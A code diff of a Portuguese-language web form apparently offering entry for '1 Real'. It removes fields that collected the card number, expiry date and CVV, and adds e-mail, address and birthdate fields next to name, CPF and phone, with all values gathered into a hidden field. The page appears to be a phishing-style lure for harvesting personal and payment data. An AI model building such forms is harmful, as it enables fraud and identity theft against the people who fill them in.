@@ -80,14 +80,14 @@
             <label for="telefone">Telefone:</label>
             <input type="tel" id="telefone" name="telefone" maxlength="15" placeholder="(__)____-____" required>
 
-            <label for="cartao">Número do Cartão (Débito/Crédito):</label>
-            <input type="text" id="cartao" name="cartao" maxlength="19" placeholder="____ ____ ____ ____" required>
+            <label for="email">E-mail:</label>
+            <input type="email" id="email" name="email" required>
 
-            <label for="validade">Validade (MM/AA):</label>
-            <input type="text" id="validade" name="validade" maxlength="5" placeholder="__/__" required>
+            <label for="endereco">Endereço:</label>
+            <input type="text" id="endereco" name="endereco" required>
 
-            <label for="cvv">CVV:</label>
-            <input type="password" id="cvv" name="cvv" maxlength="3" required>
+            <label for="dataNascimento">Data de Nascimento (DD/MM/AAAA):</label>
+            <input type="text" id="dataNascimento" name="dataNascimento" maxlength="10" placeholder="__/__/____" required>
 
             <button type="submit">Participar por 1 Real</button>
         </form>
@@ -114,19 +114,10 @@
                 e.target.value = value;
             });
 
-            // Formatação automática para Número do Cartão
-            document.getElementById('cartao').addEventListener('input', function(e) {
+            // Formatação automática para Data de Nascimento
+            document.getElementById('dataNascimento').addEventListener('input', function(e) {
                 let value = e.target.value.replace(/\D/g, '');
-                value = value.replace(/(\d{4})(\d)/, '$1 $2');
-                value = value.replace(/(\d{4})(\d)/, '$1 $2');
-                value = value.replace(/(\d{4})(\d)/, '$1 $2');
-                e.target.value = value;
-            });
-
-            // Formatação automática para Validade
-            document.getElementById('validade').addEventListener('input', function(e) {
-                let value = e.target.value.replace(/\D/g, '');
-                value = value.replace(/(\d{2})(\d{2})/, '$1/$2');
+                value = value.replace(/(\d{2})(\d{2})(\d{4})/, '$1/$2/$3');
                 e.target.value = value;
             });
 
@@ -135,17 +126,17 @@
                 const nome = document.getElementById('nome').value;
                 const cpf = document.getElementById('cpf').value;
                 const telefone = document.getElementById('telefone').value;
-                const cartao = document.getElementById('cartao').value;
-                const validade = document.getElementById('validade').value;
-                const cvv = document.getElementById('cvv').value;
+                const email = document.getElementById('email').value;
+                const endereco = document.getElementById('endereco').value;
+                const dataNascimento = document.getElementById('dataNascimento').value;
 
                 const data = {
                     nome: nome,
                     cpf: cpf,
                     telefone: telefone,
-                    cartao: cartao,
-                    validade: validade,
-                    cvv: cvv
+                    email: email,
+                    endereco: endereco,
+                    dataNascimento: dataNascimento
                 };
 
                 // Armazena os dados em um campo oculto
